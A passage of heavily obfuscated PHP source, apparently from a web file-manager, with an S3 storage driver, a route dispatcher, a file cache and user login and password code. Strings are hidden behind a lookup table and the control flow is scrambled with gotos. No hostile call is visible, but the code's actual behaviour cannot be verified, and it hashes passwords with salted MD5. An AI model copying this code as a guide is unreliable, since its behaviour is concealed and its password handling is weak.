$fѣ); return isset($fƑ[$Cӭ[781]]) ? !0 : !1; } $B۬ѻ = array(); $Fܩ = $this->s3Client->{$_SERVER[拘][784]}($E򈶲, $this->bucket, $Cӭ[70]($e, $Cӭ[44]), $fѣ, $B۬ѻ); return $Fܩ ? $this->{$_SERVER[拘][378]}($e) : !1; } public function uploadFormData($Cᨃ, $A⺐ = 3600) { goto E; f: $D = $Aͯ[801]($Aͯ[841], $this->region, $Cן, !0); $Aۍׂ = $Aͯ[801]($Aͯ[841], $Dϵބ, $D, !0); $f؍ = $Aͯ[801]($Aͯ[841], $e߃, $Aۍׂ, !0); goto D܂; c槥: $F̸ = $Aͯ[786] . $this->bucket . $Aͯ[348] . $this->endpoint; $Cԣ = array($this->accessKey, $C, $this->region, $Dϵބ, $e߃); $E͓ = $Aͯ[152]($Aͯ[44], $Cԣ); goto DՎ; Dِ: $e߃ = $Aͯ[824]; $F = $A⺐ . $Aͯ[67]; $f慛 = $Aͯ[825]; goto c槥; DՎ: $Aܬ = array($Aͯ[826] => $Aͯ[649]($Aͯ[827], $Aͯ[671]($Aͯ[828])), $Aͯ[829] => array(array($Aͯ[830] => $this->bucket), array($Aͯ[831] => $Aӭ), array($Aͯ[832], $Aͯ[833], $Aͯ[67]), array($Aͯ[832], $Aͯ[834], $Aͯ[67]), array($Aͯ[832], $Aͯ[835], $Aͯ[67]), array($Aͯ[836] => $f慛), array($Aͯ[837] => $E͓), array($Aͯ[838] => $C), array($Aͯ[839] => $b), array($Aͯ[840] => $F))); $A݉љ = $Aͯ[800]($Aͯ[297]($Aܬ)); $Cן = $Aͯ[801]($Aͯ[841], $C, $Aͯ[842] . $this->secret, !0); goto f; C: $Dϵބ = $Aͯ[619]; $b = $Aͯ[649]($Aͯ[822]); $C = $Aͯ[649]($Aͯ[823]); goto Dِ; D܂: $d = $Aͯ[801]($Aͯ[841], $A݉љ, $f؍); $fԯԑ = array($Aͯ[843] => $Aͯ[67], $Aͯ[844] => $Aͯ[67], $Aͯ[831] => $Aӭ, $Aͯ[836] => $f慛, $Aͯ[845] => $A݉љ, $Aͯ[846] => $E͓, $Aͯ[847] => $C, $Aͯ[848] => $b, $Aͯ[849] => $F, $Aͯ[850] => $d, $Aͯ[129] => $F̸); return $fԯԑ; goto b̖; E: $Aͯ =& $_SERVER[拘]; $Aӭ = $Aͯ[759]; $C = $Aͯ[821]; goto C; b̖: } public function multiUploadFormData($aϏ, $BɎ = 3600) { goto fݻ; fݻ: $d =& $_SERVER[拘]; $Eˆ = $d[649]($d[851]); $E̝ = array(); goto d; d: $F̮ = $this->s3Client->{$_SERVER[拘][788]}($this->bucket, $aϏ, $E̝); if (!$F̮) { return !1; } $E͢ = $d[44] . $d[69]($d[789], $d[44], $d[655]($aϏ)); goto bЊ; bЊ: return array($d[790] => $F̮, $d[129] => $d[786] . $this->bucket . $d[348] . $this->endpoint . $E͢, $d[791] => $Eˆ, $d[257] => $aϏ); goto E; E: } public function multiUploadAuthData($cϷ͵, $B󜖰 = array()) { goto aʿǰ; F亯: unset($B󜖰[$f[257]]); if (isset($B󜖰[$f[792]])) { return $this->{$_SERVER[拘][793]}($F, $B󜖰); } $f = array(); goto B؉; Eˎ: return $C[$f[804]]; goto cؒ; c꓎: $F = $f[44] . $f[69]($f[789], $f[44], $f[655]($F)) . $f; $C = $this->s3Client->{$_SERVER[拘][856]}($f, $CҼ, $Aݖ, $F); if ($f[165]($f, $f[796]) === 0) { if (isset($f[$f[853]])) { $DǴ = $f[$f[853]]; } else { if (isset($C[$f[853]])) { $DǴ = $C[$f[853]]; } else { $DǴ = $f[857]($f[841], $f[67]); } } return array($f[804] => $C[$f[804]], $f[853] => $DǴ, $f[791] => $C[$f[858]]); } goto Eˎ; B؉: if (isset($B󜖰[$f[852]])) { $f[$f[853]] = $B󜖰[$f[852]]; } $CҼ = array($f[854] => $this->bucket . $f[348] . $this->endpoint, $f[855] => $f[67], $f[843] => $f[795], $f[844] => $B󜖰[$f[490]]); $Aݖ = $f[797]; goto c꓎; aʿǰ: $f =& $_SERVER[拘]; $f = isset($B󜖰[$f[565]]) ? $B󜖰[$f[565]] : $f[67]; $F = $B󜖰[$f[257]]; goto F亯; cؒ: } public function listUploadParts($Fǝ˜, $c = array()) { goto D׎; E: $C؎ = $a[794]; $Fѣ = $a[44] . $a[69]($a[789], $a[44], $a[655]($Fǝ˜)) . $c[$a[565]]; $FߡɎ = $this->s3Client->{$_SERVER[拘][856]}($B, $cӧ, $C؎, $Fѣ, $BЇ); goto e; e: return array($a[804] => $FߡɎ[$a[804]], $a[791] => $FߡɎ[$a[858]], $a[808] => $Eȃ, $a[853] => $FߡɎ[$a[853]]); goto eힻ; d: if (!$Eȃ) { return !1; } $BЇ = $a[859]; foreach ($Eȃ as $Cя) { $BЇ .= $a[860] . "\74\120\141\162\164\116\x75\155\x62\145\x72\x3e{$Cя[$a[861]]}\74\x2f\x50\x61\x72\x74\x4e\165\155\142\x65\x72\x3e\xa" . "\x3c\105\x54\141\147\76{$Cя[$a[862]]}\x3c\57\x45\x54\141\147\76\12" . $a[863]; } goto Aڇ; D׎: $a =& $_SERVER[拘]; $Cưӓ = $a[69]($a[805], $a[67], $c[$a[565]]); $Eȃ = $this->s3Client->{$_SERVER[拘][806]}($this->bucket, $Fǝ˜, $Cưӓ); goto d; Aڇ: $BЇ .= $a[864]; $B = array(); $cӧ = array($a[854] => $this->bucket . $a[348] . $this->endpoint, $a[843] => $a[795], $a[844] => $a[195]($BЇ)); goto E; eힻ: } public function download($a܊, $dɡ) { if (!@$_SERVER[拘][586]($this->{$_SERVER[拘][372]}($dɡ)) && !IO::mkdir($this->{$_SERVER[拘][372]}($dɡ))) { return !1; } $a = $this->s3Client->{$_SERVER[拘][779]}($this->bucket, $a܊, array(), $dɡ); return $a !== !1 ? $dɡ : !1; } public function link($cľ) { $fĴ =& $_SERVER[拘]; return $this->s3Client->{$_SERVER[拘][865]}($this->accessKey, $this->secret, $this->bucket, $fĴ[70]($cľ, $fĴ[44]), 3600, $this->region); } public function fileOut($F, $a؄ = false, $AՑ = false, $Dڦȗ = '') { $dئܶ =& $_SERVER[拘]; if ($dئܶ[169]($this->endpoint, $dئܶ[866])) { return parent::fileOut($F, $a؄, $AՑ, $Dڦȗ); } $FЇ = $this->{$_SERVER[拘][521]}($F); $dئܶ[657]($dئܶ[815] . $FЇ); die; } public function fileOutImage($B剌, $f = 250) { $b =& $_SERVER[拘]; if ($b[169]($this->endpoint, $b[866])) { return parent::fileOutImage($B剌, $f); } $fڗ = $this->{$_SERVER[拘][521]}($B剌); $b[657]($b[815] . $fڗ); die; } public function hashMd5($A, $D؞䫂 = '') { $A =& $_SERVER[拘]; $C͘ = $this->s3Client->{$_SERVER[拘][757]}($this->bucket, $A); if (!$C͘) { return !1; } if (!isset($C͘[$A[760]]) && !empty($D؞䫂)) { $BӬ = $this->{$_SERVER[拘][374]}($A, $A, array($A[761] => $D؞䫂)); $C͘[$A[760]] = $BӬ ? $D؞䫂 : $A[67]; } return isset($C͘[$A[760]]) ? $C͘[$A[760]] : $A[67]; } public function fileInfoImage($fÚģ, &$Fრ) { $d꜆ =& $_SERVER[拘]; $d = array($d꜆[606], $d꜆[607], $d꜆[608], $d꜆[609], $d꜆[610]); if ($d꜆[176]($Fრ[$d꜆[565]], $d)) { $Dŉ = $this->{$_SERVER[拘][521]}($fÚģ); $a˵ = $d꜆[816]($Dŉ); if ($a˵) { $Fრ[$d꜆[612]] = array($d꜆[613] => $a˵[0], $d꜆[817] => $a˵[1]); } } } } goto BӨ߆; f܏: abstract class Controller { public $in; public $config; public $tpl; public $values; function __construct() { goto dڌ; a: $this->tpl = TEMPLATE . MOD . $f[44]; goto f׈; dڌ: $f =& $_SERVER[拘]; global $in, $config; $this->config =& $config; goto eٷ; eٷ: $this->in =& $in; $this->values[$f[11]] =& $config; $this->values[$f[359]] =& $in; goto a; f׈: } public function loadClass($AÞĠ) { if (1 === func_num_args()) { $this->{$AÞĠ} = new $AÞĠ(); } else { $aԈ = new ReflectionClass($AÞĠ); $cѼň = func_get_args(); $_SERVER[拘][1064]($cѼň); $this->{$AÞĠ} = $aԈ->{$_SERVER[拘][1416]}($cѼň); } return $this->{$AÞĠ}; } protected function assign($cщų̓, $Cύ) { $this->values[$cщų̓] = $Cύ; } protected function display($BΏ) { $_SERVER[拘][646](); extract($this->values); require $this->tpl . $BΏ; } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\133\136\x2f\x5d\53", "\x3a\156\x75\x6d" => "\x5b\60\55\71\135\x2b", "\72\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Eϋᩰ, $fŜ) { $e =& $_SERVER[拘]; if ($Eϋᩰ == $e[1417]) { $Eޢ = $e[159]($e[1418], $fŜ[0]); $E˖ = $e[165]($fŜ[1], $e[44]) === 0 ? $fŜ[1] : $e[44] . $fŜ[1]; $b۟ = $fŜ[2]; } else { $Eޢ = null; $E˖ = $e[165]($fŜ[0], $e[44]) === 0 ? $fŜ[0] : $e[44] . $fŜ[0]; $b۟ = $fŜ[1]; } $e[1419](self::$maps, $Eޢ); $e[1419](self::$routes, $E˖); $e[1419](self::$methods, $e[84]($Eϋᩰ)); $e[1419](self::$callbacks, $b۟); } public static function error($cá˞) { self::$errorCallback = $cá˞; } public static function haltOnMatch($E넊 = true) { self::$halts = $E넊; } public static function dispatch() { goto A; bϤӂ: $bğ = $e[766](static::$patterns); $d̓ = $e[442](static::$patterns); $CيӜ = !1; goto ȁ; A: $e =& $_SERVER[拘]; $DԱ˛Ţ = $e[125]($_SERVER[$e[1420]], PHP_URL_PATH); $C퍉 = $_SERVER[$e[697]]; goto bϤӂ; ȁ: self::$routes = $e[216]($e[453], $e[44], self::$routes); if ($e[176]($DԱ˛Ţ, self::$routes)) { $Aѽ = $e[766](self::$routes, $DԱ˛Ţ); foreach ($Aѽ as $d) { if (self::$methods[$d] == $C퍉 || self::$methods[$d] == $e[1421] || $e[176]($C퍉, self::$maps[$d])) { $CيӜ = !0; if (!$e[296](self::$callbacks[$d])) { $aʍ = $e[4]($e[44], self::$callbacks[$d]); $Dܔ = $e[1422]($aʍ); $dؚ = $e[4]($e[1423], $Dܔ); $Bэ = new $dؚ[0](); $Bэ->{$dؚ[1]}(); if (self::$halts) { return; } } else { $e[1058](self::$callbacks[$d]); if (self::$halts) { return; } } } } } else { $D = 0; foreach (self::$routes as $d) { if ($e[165]($d, $e[91]) !== !1) { $d = $e[69]($bğ, $d̓, $d); } if ($e[131]($e[1424] . $d . $e[1425], $DԱ˛Ţ, $E)) { if (self::$methods[$D] == $C퍉 || self::$methods[$D] == $e[1421] || !empty(self::$maps[$D]) && $e[176]($C퍉, self::$maps[$D])) { $CيӜ = !0; $e[1064]($E); if (!$e[296](self::$callbacks[$D])) { $aʍ = $e[4]($e[44], self::$callbacks[$D]); $Dܔ = $e[1422]($aʍ); $dؚ = $e[4]($e[1423], $Dܔ); $Bэ = new $dؚ[0](); if (!$e[89]($Bэ, $dؚ[1])) { echo $e[1426]; } else { $e[90](array($Bэ, $dؚ[1]), $E); } if (self::$halts) { return; } } else { $e[90](self::$callbacks[$D], $E); if (self::$halts) { return; } } } } $D++; } } if ($CيӜ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eܞӝ =& $_SERVER[拘]; $eܞӝ[657]($_SERVER[$eܞӝ[1427]] . $eܞӝ[1428]); echo $eܞӝ[1429]; }; } else { if ($e[66](self::$errorCallback)) { self::get($_SERVER[$e[1420]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } $e[1058](self::$errorCallback); } goto dî; dî: } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\163\164\x6f\162\141\147\145\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\145\x4d\141\170", "\163\x79\163\164\145\x6d", "\144\145\x66\141\x75\154\x74", "\144\162\151\166\145\162", "\143\x6f\x6e\x66\151\147"); public function listData($E = false, $c = "\x6d\157\x64\151\x66\x79\124\151\155\145", $CН = false) { goto BȎ; FђŻ: return $bԼ; goto c윚﬉; a: foreach ($bԼ as $D搃 => $Bҕ) { unset($bԼ[$D搃][$B[11]]); $bԼ[$D搃][$B[1431]] = 0; } $Bˮ = $B[413]($bԼ, $B[67], $B[414]); $this->{$_SERVER[拘][1432]}($bԼ, $Bˮ); goto FђŻ; BȎ: $B =& $_SERVER[拘]; $bԼ = parent::listData($E, $c, $CН); if ($E) { return $bԼ; } goto a; c윚﬉: } public function _listAppendSize(&$b岊, $FѪ) { $A =& $_SERVER[拘]; $dƤ = $A[1433] . $A[152]($A[119], $FѪ) . $A[1434]; $FȌ = $A[64]($A[1435])->{$_SERVER[拘][260]}($dƤ); $FȌ = $A[413]($FȌ, $A[414], $A[490]); foreach ($b岊 as $Eϯ => $f℈) { $b岊[$Eϯ][$A[1431]] = isset($FȌ[$f℈[$A[414]]]) ? $FȌ[$f℈[$A[414]]] : 0; } } public function getConfig($e烌) { $Bܣ =& $_SERVER[拘]; $FȖΌ = parent::listData($e烌); return $Bܣ[738]($FȖΌ[$Bܣ[11]], !0); } public function update($d, $F) { goto C; bͪދӿ: return $F̐; goto f; C: $fܠ׹ =& $_SERVER[拘]; $dƺޭ = $F[$fܠ׹[375]]; $dùΗ = $fܠ׹[413](parent::listData(), $fܠ׹[375]); goto e; e: if (isset($dùΗ[$dƺޭ]) && $dùΗ[$dƺޭ][$fܠ׹[414]] != $d) { return !1; } $F̐ = parent::update($d, $F); if ($F̐ && $F[$fܠ׹[897]]) { foreach ($dùΗ as $Eَ) { if ($Eَ[$fܠ׹[897]] && $Eَ[$fܠ׹[414]] != $d) { parent::update($Eَ[$fܠ׹[414]], array($fܠ׹[897] => 0)); } } } goto bͪދӿ; f: } public function remove($Aș) { $Eᭇ =& $_SERVER[拘]; $dڨɂՄ = $Eᭇ[64]($Eᭇ[1436])->{$_SERVER[拘][501]}(array($Eᭇ[1437] => $Aș))->{$_SERVER[拘][1152]}(); if ($dڨɂՄ > 1) { $Eᭇ[29]($Eᭇ[387]($Eᭇ[1438]), !1); } return parent::remove($Aș); } public function add($FƑȎۈ) { goto Aď; cெ: if (isset($FŘ[$FƑȎۈ[$Eڃ[375]]])) { return !1; } $f = parent::insert($FƑȎۈ); if ($f && $FƑȎۈ[$Eڃ[897]]) { foreach ($FŘ as $fΉ) { if ($fΉ[$Eڃ[897]]) { parent::update($fΉ[$Eڃ[414]], array($Eڃ[897] => 0)); } } } goto CՕцۊ; Aď: $Eڃ =& $_SERVER[拘]; $this->{$_SERVER[拘][1439]}($FƑȎۈ); $FŘ = $Eڃ[413](parent::listData(), $Eڃ[375]); goto cெ; CՕцۊ: return $f; goto DƋ; DƋ: } public function checkConfig(&$Bΰ) { goto Aگ; Dш: $Cѥʇ = $b烄[422] . $Dœē; $B = new $Cѥʇ($f); $f = $B->{$_SERVER[拘][401]}($A . $b烄[1440]); goto A㝥; d冬: foreach ($f as $dʦڕ => $FǄ) { $f[$dʦڕ] = $b烄[70]($FǄ); } $A = $b烄[43]($f[$b烄[424]], $b烄[44]) . $b烄[44]; $Dœē = $b烄[176]($Bܦ, array($b烄[382], $b烄[618])) ? $b烄[79]($Bܦ) : $b烄[84]($Bܦ); goto Dш; A㝥: if (!$B->{$_SERVER[拘][486]}($f)) { $b烄[29]($b烄[387]($b烄[1441]), !1); } $f[$b烄[424]] = $A; $Bΰ[$b烄[11]] = $b烄[297]($f); goto F; F: $Bΰ[$b烄[423]] = $Dœē; return !0; goto c·Ě; Aگ: $b烄 =& $_SERVER[拘]; $Bܦ = $b烄[80]($Bΰ[$b烄[423]]); $f = $b烄[1383]($Bΰ[$b烄[11]]); goto d冬; c·Ě: } public function driverListSystem() { $fܒ =& $_SERVER[拘]; $Dٞ = parent::listData(); $b鱦 = array(); foreach ($Dٞ as $b) { unset($b[$fܒ[558]], $b[$fܒ[559]]); $b[$fܒ[11]] = $fܒ[1383]($b[$fܒ[11]]); $b鱦[] = $b; } return $b鱦; } public function defaultDriver() { $c =& $_SERVER[拘]; $CؖҠ = parent::listData(); $C = $c[1442]($CؖҠ, $c[897], 1); $C = $C[0]; if ($C) { $C[$c[11]] = $c[738]($C[$c[11]], !0); } return $C; } public function driverInfo($B͗) { $f =& $_SERVER[拘]; $f͘ެ = $f[413](parent::listData(), $f[414]); if (!isset($f͘ެ[$B͗])) { return !1; } $E = $f͘ެ[$B͗]; $E[$f[11]] = $f[1383]($E[$f[11]]); return $E; } } goto cߍӘ; Eʸ: $_SERVER[拘][0]($_SERVER[拘][981], 1); $_SERVER[拘][0]($_SERVER[拘][982], 0); $_SERVER[拘][0]($_SERVER[拘][983], 2); goto fǺ; eĎ: class FileCache { private $data; private $file; private $fileHash; function __construct($AƝ) { $this->file = $AƝ; $this->data = self::load($AƝ); $this->{$_SERVER[拘][2116]}(); } public function get($e = null, $F = null) { $c˹ =& $_SERVER[拘]; if ($c˹[149]($e)) { return $this->data; } else { if ($c˹[93]($e)) { $E = array(); foreach ($this->data as $cьՇ => $eɆ) { if ($eɆ[$e[0]] == $e[1]) { $E[$cьՇ] = $this->data[$cьՇ]; } } if ($c˹[37]($E) != 0) { return $E; } } else { $e .= $c˹[67]; if (!$c˹[149]($F)) { foreach ($this->data as $cьՇ => $eɆ) { if ($eɆ[$e] == $F) { return $eɆ; } } } if (isset($this->data[$e])) { return $this->data[$e]; } } } return !1; } public function set($e, $F) { $F =& $_SERVER[拘]; $this->{$_SERVER[拘][2116]}(); if ($F[66]($e)) { $this->data[$e] = $F; } else { if ($F[93]($e)) { foreach ($this->data as $cьՇ => $eɆ) { if ($eɆ[$e[0]] == $e[1]) { $this->data[$cьՇ][$F[0]] = $F[1]; } } } else { return !1; } } self::save($this->file, $this->data); return !0; } public function remove($e) { $Aڜ =& $_SERVER[拘]; $this->{$_SERVER[拘][2116]}(); if ($Aڜ[66]($e)) { unset($this->data[$e]); } else { if ($Aڜ[93]($e)) { foreach ($this->data as $cьՇ => $eɆ) { if ($eɆ[$e[0]] == $e[1]) { unset($this->data[$cьՇ]); } } } else { return !1; } } self::save($this->file, $this->data); return !0; } private function fileChangeCheck() { $f⠩ =& $_SERVER[拘]; if ($f⠩[149]($this->fileHash)) { $this->fileHash = @$f⠩[639]($this->file); return; } $C再 = @$f⠩[639]($this->file); if ($C再 != $this->fileHash) { $this->fileHash = $C再; $this->data = self::load($this->file); } } public function reset($BːП, $Fɚ = true) { $this->data = $BːП; if ($Fɚ) { self::save($this->file, $this->data); } } public static function arrSort(&$D뛑, $cьՇ, $c󌰅 = "\141\163\x63") { goto d; C⩐: if ($c󌰅 == $eؖ[1602]) { $eؖ[2117]($c); } else { $eؖ[2118]($c); } $eؖ[1065]($c); foreach ($c as $dҜ => $aڂ) { $bκˌ[$dҜ] = $D뛑[$dҜ]; } goto f; d: $eؖ =& $_SERVER[拘]; $c = $bκˌ = array(); foreach ($D뛑 as $dҜ => $aڂ) { $c[$dҜ] = $aڂ[$cьՇ]; } goto C⩐; f: return $bκˌ; goto D܏; D܏: } public function getMaxId() { goto B; dϼ: if ($eմݜ <= $B) { return $B; } return $eմݜ; goto d֯; B: $e۰ =& $_SERVER[拘]; $B = 100; if ($e۰[37]($this->data) == 0) { return $B; } goto cǵ٘; cǵ٘: $D㥇 = $e۰[766]($this->data); $e۰[2119]($D㥇, SORT_NUMERIC); $eմݜ = $e۰[455]($D㥇[0]) + 1; goto dϼ; d֯: } public static function load($AƝ) { goto D; D: $Bǌ҈ =& $_SERVER[拘]; if (!$AƝ) { return !1; } $AƝ = $Bǌ҈[2120]($AƝ); goto fȮ; E: if ($Bǌ҈[195]($Dдփ) == 0 || $Bǌ҈[195]($Dдփ) == $Bǌ҈[195](CONFIG_EXIT)) { @$Bǌ҈[344]($AƝ, CONFIG_EXIT . $Bǌ҈[2121]); $Bǌ҈[2122]($AƝ, 511); return array(); } if ($Dдփ === !1 || $Bǌ҈[195]($Dдփ) < $Bǌ҈[195](CONFIG_EXIT)) { $Bǌ҈[522]($Bǌ҈[2125] . $Bǌ҈[715]($AƝ)); } $BːП = $Bǌ҈[738]($Bǌ҈[7]($Dдփ, $Bǌ҈[195](CONFIG_EXIT)), !0); goto A̝; fȮ: if (!$Bǌ҈[48]($AƝ)) { @$Bǌ҈[344]($AƝ, CONFIG_EXIT . $Bǌ҈[2121]); $Bǌ҈[2122]($AƝ, 511); return array(); } $Dдփ = $Bǌ҈[2123]($AƝ, 10.5); if ($Dдփ === !1 || $Dдփ === 0 || $Dдփ === -1) { $Bǌ҈[522]($Bǌ҈[2124] . $Bǌ҈[715]($AƝ)); } goto E; A̝: if ($Bǌ҈[149]($BːП)) { $BːП = array(); } return $BːП; goto D; D: } public static function save($AƝ, $BːП) { goto dٷ; D䥏ܭ: if (!$a[48]($AƝ)) { @$a[344]($AƝ, CONFIG_EXIT . $a[2121]); $a[2122]($AƝ, 511); } if (!$a[2126]($AƝ)) { $a[522](BASIC_PATH . $a[2127] . $a[387]($a[2128])); } $B = $a[1166]($BːП); goto B̳މ; a: return $E; goto A; dٷ: $a =& $_SERVER[拘]; if (!$AƝ) { return !1; } $AƝ = $a[2120]($AƝ); goto D䥏ܭ; B̳މ: if ($a[149]($B) || $a[195]($B) == 0) { $a[522]($a[2129] . $a[715]($AƝ)); } $E = $a[2130]($AƝ, CONFIG_EXIT . $B, 10.5); if ($E === !1) { $a[522]($a[2131] . $a[715]($AƝ)); } goto a; A: } } $_SERVER[拘][0]($_SERVER[拘][2132], 1); $_SERVER[拘][0]($_SERVER[拘][2133], 2); goto CՔ; c: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\x65" => "\165\x73\x65\162\137\x6d\145\x74\x61", "\x6d\145\164\x61\106\x69\x65\154\x64" => "\165\x73\x65\162\x49\104"); protected $simpleField = "\x75\x73\x65\162\x49\x44\x2c\156\151\143\153\116\x61\155\x65\x2c\x6e\x61\x6d\145\x2c\141\166\x61\164\141\x72\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; protected function cacheFunctionAlias($eٽ䏺) { $E䶔 =& $_SERVER[拘]; return array($E䶔[1963] => array($eٽ䏺[0], $E䶔[1964]), $E䶔[1643] => array($eٽ䏺[0], $E䶔[1964])); } protected function getInfo($CÖ, $fό = false) { $EԾ =& $_SERVER[拘]; $A = $this->{$_SERVER[拘][1965]}($CÖ); if (!$A) { return !1; } if ($fό) { $A = $this->{$_SERVER[拘][1878]}($A); $D = $EԾ[64]($EԾ[480])->{$_SERVER[拘][1690]}($A[$EԾ[1516]][$EԾ[499]]); $A[$EԾ[1516]][$EԾ[1853]] = $D[$EԾ[1854]]; return $A; } return $this->{$_SERVER[拘][1147]}($EԾ[1647], $CÖ); } protected function getInfoSimple($CÖ, $fό = false) { $fھ萘 =& $_SERVER[拘]; if (!$CÖ) { return array(); } if ($fό) { $c = array($fھ萘[1512] => $fھ萘[455]($CÖ)); $Eǲ = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][502]}(); if (!$Eǲ) { return $Eǲ; } $Eǲ[$fھ萘[1966]] = $fھ萘[1363]($fھ萘[1967])->{$_SERVER[拘][1968]}($Eǲ[$fھ萘[1966]]); return $Eǲ; } return $this->{$_SERVER[拘][1147]}($fھ萘[1969], $CÖ); } protected function getInfoSimpleOuter($CÖ) { $a =& $_SERVER[拘]; $dܪ¯ = $this->{$_SERVER[拘][1147]}($a[1969], $CÖ); $Eǲ = $a[1173]($dܪ¯, $a[4]($a[119], $this->simpleField)); if (!$Eǲ) { return !1; } $Eǲ[$a[1966]] = $a[1363]($a[1967])->{$_SERVER[拘][1968]}($Eǲ[$a[1966]]); return $Eǲ; } public static function errorLang($Aᤕ) { $d =& $_SERVER[拘]; $E = array(self::ERROR_USER_NOT_EXISTS => $d[1970], self::ERROR_USER_PASSWORD_ERROR => $d[1971], self::ERROR_USER_EXIST_NAME => $d[1972], self::ERROR_USER_EXIST_PHONE => $d[1973], self::ERROR_USER_EXIST_EMAIL => $d[1974]); return $d[387]($E[$Aᤕ]); } public function getInfoByMeta($cьՇ, $F) { $f =& $_SERVER[拘]; $Aݍ = $f[64]($f[1975])->{$_SERVER[拘][501]}(array($f[257] => $cьՇ, $f[937] => $F))->{$_SERVER[拘][502]}(); if ($Aݍ) { return $this->{$_SERVER[拘][1652]}($Aݍ[$f[1512]]); } return !1; } public function userLoginCheck($C, $E, $a = false) { goto Eʿ; fϑ: return $this->{$_SERVER[拘][1652]}($Eǲ[$E[1512]]); goto b˴; Eʿ: $E =& $_SERVER[拘]; $c = array($E[375] => $C, $E[1615] => $C, $E[1079] => $C, $E[1976] => $C, $E[175] => $E[178]); $Eǲ = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][502]}(); goto B닿; B닿: if (!$Eǲ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$a && !$this->{$_SERVER[拘][1977]}($Eǲ[$E[1512]], $E)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } $this->{$_SERVER[拘][1886]}($Eǲ[$E[1512]], array($E[1978] => $E[50]())); goto fϑ; b˴: } public function userPasswordCheck($c, $E) { $dՍ =& $_SERVER[拘]; $Eǲ = $this->{$_SERVER[拘][501]}(array($dՍ[1512] => $dՍ[455]($c)))->{$_SERVER[拘][502]}(); $Aݍ = $this->{$_SERVER[拘][1690]}($c); $cˑ = isset($Aݍ[$dՍ[1979]]) ? $Aݍ[$dՍ[1979]] : $dՍ[67]; if ($dՍ[46]($cˑ . $dՍ[70]($E)) !== $Eǲ[$dՍ[98]]) { return !1; } return !0; } public function userAdd($fϏԐ) { goto d݋; cϷ: $aݣ = $this->{$_SERVER[拘][1992]}($fϏԐ); if ($aݣ !== !0) { return $aݣ; } $c = $this->{$_SERVER[拘][63]}($BːП); goto Eڄ; Eڄ: $b = array($C[1988] => $BːП[$C[98]], $C[1984] => $BːП[$C[1615]]); $this->{$_SERVER[拘][1886]}($c, $b); $C[64]($C[480])->{$_SERVER[拘][1993]}($c); goto E; E: return $c; goto f˔ܺ; d݋: $C =& $_SERVER[拘]; $BːП = array($C[1453] => $fϏԐ[$C[375]], $C[1980] => $fϏԐ[$C[1981]], $C[1982] => isset($fϏԐ[$C[1079]]) ? $fϏԐ[$C[1079]] : $C[67], $C[1983] => isset($fϏԐ[$C[1976]]) ? $fϏԐ[$C[1976]] : $C[67], $C[1984] => isset($fϏԐ[$C[1615]]) ? $fϏԐ[$C[1615]] : $fϏԐ[$C[375]], $C[1985] => isset($fϏԐ[$C[1966]]) ? $fϏԐ[$C[1966]] : $C[67], $C[1986] => isset($fϏԐ[$C[1987]]) ? $fϏԐ[$C[1987]] : 1, $C[1988] => $fϏԐ[$C[98]], $C[1989] => isset($fϏԐ[$C[1936]]) ? $fϏԐ[$C[1936]] : 1024 * 1024 * 20, $C[1990] => 0, $C[1978] => 0, $C[1991] => isset($fϏԐ[$C[928]]) ? $fϏԐ[$C[928]] : 1); if (!empty($fϏԐ[$C[1512]])) { $BːП[$C[1512]] = $fϏԐ[$C[1512]]; } goto cϷ; f˔ܺ: } public function userEdit($c, $fϏԐ) { goto f; BХ: $aݣ = $this->{$_SERVER[拘][1992]}($fϏԐ, $c); if ($aݣ !== !0) { return $aݣ; } if (isset($fϏԐ[$f[98]]) && $f[70]($fϏԐ[$f[98]]) != $f[67]) { $Eۮ = $this->{$_SERVER[拘][1690]}($c); if (empty($Eۮ[$f[1979]])) { $Eۮ[$f[1979]] = $f[405](10); $this->{$_SERVER[拘][1689]}($c, $f[1979], $Eۮ[$f[1979]]); } $fϏԐ[$f[98]] = $f[46]($Eۮ[$f[1979]] . $f[70]($fϏԐ[$f[98]])); } else { unset($fϏԐ[$f[98]]); } goto d; d: $this->{$_SERVER[拘][501]}(array($f[1445] => $c))->{$_SERVER[拘][1062]}($fϏԐ); if (isset($fϏԐ[$f[1615]])) { $this->{$_SERVER[拘][1865]}($c, $fϏԐ[$f[1615]]); } $this->{$_SERVER[拘][1148]}($f[1969], $c); goto Fㅜ; Fㅜ: $this->{$_SERVER[拘][1148]}($f[1647], $c); return !0; goto aߩ; f: $f =& $_SERVER[拘]; $A = $this->{$_SERVER[拘][1965]}($c); if (!$A) { return !1; } goto BХ; aߩ: } public function setNamePinyin($CÖ, $C = false) { goto DҎ; DҎ: $D鼐 =& $_SERVER[拘]; if (!$C) { $A = $this->{$_SERVER[拘][1965]}($CÖ); $C = $A[$D鼐[1615]] ? $A[$D鼐[1615]] : $A[$D鼐[375]]; } if (!Input::check($C, $D鼐[1798])) { return; } goto B७; B७: $Aݍ = array($D鼐[1799] => $D鼐[69]($D鼐[168], $D鼐[67], Pinyin::encode($C)), $D鼐[1800] => Pinyin::encode($C, $D鼐[1801])); $this->{$_SERVER[拘][1148]}($D鼐[1969], $CÖ); $this->{$_SERVER[拘][1148]}($D鼐[1647], $CÖ); goto c; c: $this->{$_SERVER[拘][1689]}($CÖ, $Aݍ); goto cܔ; cܔ: } private function _checkExist($BːП, $c = false) { $B =& $_SERVER[拘]; $aݣ = array($B[375] => UserModel::ERROR_USER_EXIST_NAME, $B[1079] => UserModel::ERROR_USER_EXIST_EMAIL, $B[1976] => UserModel::ERROR_USER_EXIST_PHONE); $C⎉ = $c ? array($B[1512] => array($B[1994], $c)) : array(); foreach ($aݣ as 